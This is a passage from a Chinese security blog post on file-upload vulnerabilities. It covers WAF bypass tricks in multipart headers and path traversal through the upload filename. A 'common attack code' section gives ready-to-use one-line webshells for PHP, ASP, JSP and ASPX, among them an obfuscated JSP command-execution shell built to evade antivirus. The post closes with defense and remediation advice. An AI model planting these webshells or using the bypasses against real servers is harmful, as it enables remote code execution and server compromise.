<h5 id="修改-Content-Disposition-字段值的大小写绕过"><a href="#修改-Content-Disposition-字段值的大小写绕过" class="headerlink" title="修改 Content-Disposition 字段值的大小写绕过"></a>修改 Content-Disposition 字段值的大小写绕过</h5><pre><code>Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;bk.php&quot;
</code></pre>
<p>改成</p>
<pre><code>Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.php
</code></pre>
<h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果 web 程序会将 filename 除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。         Content-Disposition: form-data; name&#x3D;”  file1”;</p>
<p>filename&#x3D;”bk……………………………………………………………………………………………………..</p>
<p>………………………………………………………………………………………………asp”大概几百个点。</p>
<h5 id="删除-Content-Disposition-值的-form-data-绕过"><a href="#删除-Content-Disposition-值的-form-data-绕过" class="headerlink" title="删除 Content-Disposition 值的 form-data 绕过"></a>删除 Content-Disposition 值的 form-data 绕过</h5><p>有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。</p>
<pre><code>Content-Disposition: form-data; name=&quot;file1&quot;; filename= &quot;bk.php&quot;
</code></pre>
<p>改为：</p>
<pre><code>Content-Disposition: name=&quot;file1&quot;; filename= &quot;bk.php
</code></pre>
<h3 id="文件上传中的目录穿越漏洞"><a href="#文件上传中的目录穿越漏洞" class="headerlink" title="文件上传中的目录穿越漏洞"></a>文件上传中的目录穿越漏洞</h3><p>形式：上传的文件会被解析为日志不能执行，给出了<code>/uploads/xxx.php</code>路径并且可以查询</p>
<p>绕过：上传文件的时候抓包，修改文件名（filename）为<code>./../../../../flag</code>，上传成功后路径变为<code>/uploads/./../../../../flag</code>即可进行目录穿越</p>
<h4 id="常用攻击代码"><a href="#常用攻击代码" class="headerlink" title="常用攻击代码"></a>常用攻击代码</h4><blockquote>
<p>简单的一句话木马</p>
<pre><code class="text">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;
</code></pre>
<p>绕过<code>&lt;?</code>限制的一句话木马</p>
<pre><code class="text">&lt;script language = &#39;php&#39;&gt;@eval($_POST[cmd]);&lt;/script&gt;
</code></pre>
<p>绕过<code>&lt;?php ?&gt;</code>限制的一句话木马</p>
<pre><code class="text">&lt;?= @eval($_POST[&#39;cmd&#39;]);
</code></pre>
<p>asp一句话木马</p>
<pre><code class="text">&lt;%eval(Request.Item[&quot;cmd&quot;],”unsafe”);%&gt;
</code></pre>
<p>JSP一句话木马</p>
<pre><code class="text">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;
</code></pre>
<p>JSP一句话免杀（ASCLL编码）</p>
<pre><code class="text">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;
&lt;%
    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;
        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));
        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );
        java.io.InputStream in = e.getInputStream();
        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);
    &#125;
%&gt;
</code></pre>
<p>ASPX一句话</p>
<pre><code class="text">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;
</code></pre>
</blockquote>
<h4 id="其它攻击代码"><a href="#其它攻击代码" class="headerlink" title="其它攻击代码"></a>其它攻击代码</h4><blockquote>
<p>异或取反等操作写shell的php脚本、混淆木马、不死马</p>
</blockquote>
<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ul>
<li>文件扩展名服务端白名单效验</li>
<li>文件内容服务端效验</li>
<li>上传文件重命名</li>
<li>隐藏上传文件路径</li>
<li>限制相关目录的执行权限，防范WebShell攻击</li>
</ul>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="1-服务器配置不当"><a href="#1-服务器配置不当" class="headerlink" title="1.服务器配置不当:"></a>1.服务器配置不当:</h3><p>重新配置好服务器。服务器PUT方法配置不当。</p>
<h3 id="2-开源编辑器上传漏洞"><a href="#2-开源编辑器上传漏洞" class="headerlink" title="2. 开源编辑器上传漏洞:"></a>2. 开源编辑器上传漏洞:</h3><p>若新版编辑器已修复漏洞，请更新编辑器版本。</p>
<h3 id="3-本地文件上传限制被绕过"><a href="#3-本地文件上传限制被绕过" class="headerlink" title="3.本地文件上传限制被绕过:"></a>3.本地文件上传限制被绕过:</h3><p>在服务器后端对上传的文件迚行过滤。</p>
<h3 id="4-设置文件上传的目录设置为不可执行"><a href="#4-设置文件上传的目录设置为不可执行" class="headerlink" title="4.设置文件上传的目录设置为不可执行"></a>4.设置文件上传的目录设置为不可执行</h3><p>只要web容器无法解析该目录下面的文件，卲使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
<h3 id="5-判断文件类型"><a href="#5-判断文件类型" class="headerlink" title="5.判断文件类型"></a>5.判断文件类型</h3><p>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者 resize 函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
<h3 id="6-使用随机数改写文件名和文件路径"><a href="#6-使用随机数改写文件名和文件路径" class="headerlink" title="6.使用随机数改写文件名和文件路径"></a>6.使用随机数改写文件名和文件路径</h3><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar 和 crossdomain.xml 这种文件，都将因为重命名而无法攻击。</p>
<h3 id="7-单独设置文件服务器的域名"><a href="#7-单独设置文件服务器的域名" class="headerlink" title="7.单独设置文件服务器的域名"></a>7.单独设置文件服务器的域名</h3><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利用等问题将得到解决。</p>

    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 20xx - 2022 Hexo
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @John Doe
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>